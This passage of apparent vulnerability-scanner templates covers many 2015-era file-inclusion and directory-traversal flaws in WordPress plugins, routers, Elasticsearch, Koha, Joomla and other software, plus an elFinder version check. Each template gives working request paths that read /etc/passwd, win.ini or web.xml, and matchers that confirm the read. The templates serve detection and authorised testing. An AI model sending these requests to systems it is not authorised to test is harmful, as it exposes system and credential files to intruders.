  1. root:.\*:0:0:
- part - body

**Type - status**

- status
  1. 200

---

# ManageEngine Firewall Analyzer \<8.0 - Local File Inclusion

## Description

- ManageEngine Firewall Analyzer before 8.0 is vulnerable to local file inclusion.
- severity - medium
- tags - manageengine,edb,cve,cve2015,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/fw/mindex.do?url=./WEB-INF/web.xml%3f

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. \</web-app>
  2. java.sun.com
- part - body
- condition - and

**Type - word**

- part - header
- words
  1. application/xml

---

# Magento Server MAGMI - Directory Traversal

## Description

- Magento Server MAGMI (aka Magento Mass Importer) contains a directory traversal vulnerability in web/ajax_pluginconf.php. that allows remote attackers to read arbitrary files via a .. (dot dot) in the file parameter.
- severity - high
- tags - plugin,edb,packetstorm,cve,cve2015,lfi,magento,magmi

## Requests

- Method - GET

### URL

- {{BaseURL}}/magmi/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# WordPress MDC YouTube Downloader 2.1.0 - Local File Inclusion

## Description

- WordPress MDC YouTube Downloader 2.1.0 plugin is susceptible to local file inclusion. A remote attacker can read arbitrary files via a full pathname in the file parameter to includes/download.php.
- severity - high
- tags - cve,cve2015,wp,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/mdc-youtube-downloader/includes/download.php?file=/etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Elasticsearch - Local File Inclusion

## Description

- Elasticsearch before 1.4.5 and 1.5.x before 1.5.2 allows remote attackers to read arbitrary files via unspecified vectors when a site plugin is enabled.
- severity - high
- tags - edb,cve,cve2015,elastic,lfi,elasticsearch,plugin

## Requests

- Method - GET

### URL

- {{BaseURL}}/\_plugin/head/../../../../../../../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

**Type - status**

- status
  1. 200

---

# WordPress Simple Image Manipulator \< 1.0 - Local File Inclusion

## Description

- WordPress Simple Image Manipulator 1.0 is vulnerable to local file inclusion in ./simple-image-manipulator/controller/download.php because no checks are made to authenticate users or sanitize input when determining file location.

- severity - high
- tags - packetstorm,wpscan,cve,cve2015,wordpress,wp-plugin,lfi,wp

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/./simple-image-manipulator/controller/download.php?filepath=/etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Swim Team \<= v1.44.10777 - Local File Inclusion

## Description

- The program /wp-swimteam/include/user/download.php allows unauthenticated attackers to retrieve arbitrary files from the system.
- severity - medium
- tags - cve,cve2015,wordpress,wp-plugin,lfi,wpscan,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/wp-swimteam/include/user/download.php?file=/etc/passwd&filename=/etc/passwd&contenttype=text/html&transient=1&abspath=/usr/share/wordpress

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# WordPress SE HTML5 Album Audio Player 1.1.0 - Directory Traversal

## Description

- WordPress SE HTML5 Album Audio Player 1.1.0 contains a directory traversal vulnerability in download_audio.php that allows remote attackers to read arbitrary files via a .. (dot dot) in the file parameter.
- severity - high
- tags - cve,cve2015,wordpress,wp-plugin,lfi,edb,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/se-html5-album-audio-player/download_audio.php?file=/wp-content/uploads/../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Bonita BPM Portal \<6.5.3 - Local File Inclusion

## Description

- Bonita BPM Portal before 6.5.3 allows remote attackers to read arbitrary files via a .. (dot dot) in the theme parameter and a file path in the location parameter to bonita/portal/themeResource.
- severity - high
- tags - unauth,packetstorm,cve,cve2015,bonita,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/bonita/portal/themeResource?theme=portal/../../../../../../../../../../../../../../../../&location=etc/passwd
- {{BaseURL}}/bonita/portal/themeResource?theme=portal/../../../../../../../../../../../../../../../../&location=Windows/win.ini

### Matchers

**Type - word**

- part - body
- words
  1. bit app support
  2. fonts
  3. extensions
- condition - and

**Type - regex**

- regex
  1. root:[x*]:0:0:

---

# IceWarp Mail Server \<11.1.1 - Directory Traversal

## Description

- IceWarp Mail Server versions prior to 11.1.1 suffer from a directory traversal vulnerability.
- severity - high
- tags - lfi,mail,packetstorm,cve,cve2015,icewarp

## Requests

- Method - GET

### URL

- {{BaseURL}}/webmail/old/calendar/minimizer/index.php?script=...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2fetc%2fpasswd
- {{BaseURL}}/webmail/old/calendar/minimizer/index.php?style=...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2fetc%2fpasswd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# WordPress RobotCPA 5 - Directory Traversal

## Description

- The RobotCPA plugin 5 for WordPress has directory traversal via the f.php l parameter.
- severity - high
- tags - wp-plugin,lfi,edb,cve,cve2015,wordpress

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/robotcpa/f.php?l=ZmlsZTovLy9ldGMvcGFzc3dk

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

**Type - status**

- status
  1. 200

---

# WordPress Candidate Application Form \<= 1.3 - Local File Inclusion

## Description

- WordPress Candidate Application Form \<= 1.3 is susceptible to arbitrary file downloads because the code in downloadpdffile.php does not do any sanity checks.

- severity - high
- tags - wpscan,cve,cve2015,wordpress,wp-plugin,lfi,wp

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/candidate-application-form/downloadpdffile.php?fileName=../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# WordPress MyPixs \<=0.3 - Local File Inclusion

## Description

- WordPress MyPixs 0.3 and prior contains a local file inclusion vulnerability.
- severity - high
- tags - cve2015,wordpress,wp-plugin,lfi,wpscan,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/mypixs/mypixs/downloadpage.php?url=/etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

**Type - status**

- status
  1. 200

---

# Ericsson Drutt MSDP - Local File Inclusion

## Description

- Ericsson Drutt Mobile Service Delivery Platform (MSDP) 4, 5, and 6 allows remote attackers to read arbitrary files via a ..%2f (dot dot encoded slash) in the default URI in the Instance Monitor.
- severity - high
- tags - cve,cve2015,lfi,ericsson,edb,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# TP-LINK - Local File Inclusion

## Description

- TP-LINK is susceptible to local file inclusion in these products: Archer C5 (1.2) with firmware before 150317, Archer C7 (2.0) with firmware before 150304, and C8 (1.0) with firmware before 150316, Archer C9 (1.0), TL-WDR3500 (1.0), TL-WDR3600 (1.0), and TL-WDR4300 (1.0) with firmware before 150302, TL-WR740N (5.0) and TL-WR741ND (5.0) with firmware before 150312, and TL-WR841N (9.0), TL-WR841N (10.0), TL-WR841ND (9.0), and TL-WR841ND (10.0) with firmware before 150310. Because of insufficient input validation, arbitrary local files can be disclosed. Files that include passwords and other sensitive information can be accessed.

- severity - high
- tags - router,lfi,seclists,cve,cve2015,tplink,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/login/../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Koha 3.20.1 - Directory Traversal

## Description

- Koha 3.14.x before 3.14.16, 3.16.x before 3.16.12, 3.18.x before 3.18.08, and 3.20.x before 3.20.1 allow remote attackers to read arbitrary files via a ..%2f (dot dot encoded slash) in the template_path parameter to (1) svc/virtualshelves/search or (2) svc/members/search.
- severity - high
- tags - cve,cve2015,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/cgi-bin/koha/svc/virtualshelves/search?template_path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Xceedium Xsuite \<=2.4.4.5 - Local File Inclusion

## Description

- Xceedium Xsuite 2.4.4.5 and earlier is vulnerable to local file inclusion via opm/read_sessionlog.php that allows remote attackers to read arbitrary files in the logFile parameter.
- severity - high
- tags - xceedium,xsuite,lfi,packetstorm,cve,cve2015

## Requests

- Method - GET

### URL

- {{BaseURL}}/opm/read_sessionlog.php?logFile=....//....//....//....//etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# D-Link DVG-N5402SP - Local File Inclusion

## Description

- D-Link DVG-N5402SP is susceptible to local file inclusion in products with firmware W1000CN-00, W1000CN-03, or W2000EN-00. A remote attacker can read sensitive information via a .. (dot dot) in the errorpage parameter.

- severity - high
- tags - cve,cve2015,dlink,lfi,packetstorm,edb

## Requests

### Step - 1

```
POST /cgibin/webproc HTTP/1.1
Host: {{Hostname}}

getpage=html%2Findex.html&*errorpage*=../../../../../../../../../../../etc/passwd&var%3Amenu=setup&var%3Apage=connected&var%&objaction=auth&%3Ausername=blah&%3Apassword=blah&%3Aaction=login&%3Asessionid=abcdefgh

```

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

---

# ResourceSpace - Local File inclusion

## Description

- ResourceSpace is prone to a local file-inclusion vulnerability because it fails to sufficiently sanitize user-supplied input.
- severity - high
- tags - lfi,resourcespace,packetstorm,cve,cve2015

## Requests

- Method - GET

### URL

- {{BaseURL}}/pages/setup.php?defaultlanguage=..%2f..%2f..%2f..%2f..%2fetc%2fpasswd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! RSfiles \<=1.0.2 - Local File Inclusion

## Description

- Joomla! RSfiles 1.0.2 and earlier is susceptible to local file inclusion in index.php in the RSfiles component (com_rsfiles). This could allow remote attackers to arbitrarily read files via a .. (dot dot) in the path parameter in a files.display action.
- severity - high
- tags - lfi,edb,cve,cve2007,joomla

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_rsfiles&task=files.display&path=../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# elFinder - Install Detection

## Description

- An elFinder implementation was discovered.
- severity - info
- tags - tech,elfinder

## Requests

- Method - GET

### URL

- {{BaseURL}}
- {{BaseURL}}/elfinder.html

### Matchers

**Type - word**

- part - body
- words
  1. \<!-- Element where elFinder will be created (REQUIRED) -->

**Type - status**

- status
  1. 200

---

# elFinder 2.1.58 - Remote Code Execution

## Description

- elFinder 2.1.58 is vulnerable to remote code execution. This can allow an attacker to execute arbitrary code and commands on the server hosting the elFinder PHP connector, even with minimal configuration.
- severity - critical
- tags - tech,elfinder,oss

## Requests

- Method - GET

### URL

- {{BaseURL}}/js/elfinder.min.js
- {{BaseURL}}/js/elFinder.version.js

### Matchers

**Type - word**

- part - body
- words
  1. elFinder - file manager for web
  2. elFinder.prototype.version =
- condition - or

**Type - status**

- status
  1. 200

### Extractors

**Type - regex**

- group - 1
- regex
  1. \* Version (.+) \(
  2. elFinder.prototype.version = '([0-9.]+)';

---

# D-Link - Local File Inclusion

## Description

- D-Link is vulnerable to local file inclusion.
- severity - high
- tags - dlink,lfi

## Requests

- Method - POST
- Method - POST

### URL

- {{BaseURL}}/cgi-bin/webproc
  - errorpage=/etc/passwd&obj-action=auth&:action=login

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

**Type - status**

- status
  1. 200

---

# Jolokia - Local File Inclusion

## Description

- Jolokia is vulnerable to local file inclusion via compilerDirectivesAdd.
- severity - high
- tags - jolokia,springboot,tomcat,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd
- {{BaseURL}}/actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
  2. compilerDirectivesAdd
- condition - and

**Type - status**

- status
  1. 200

---
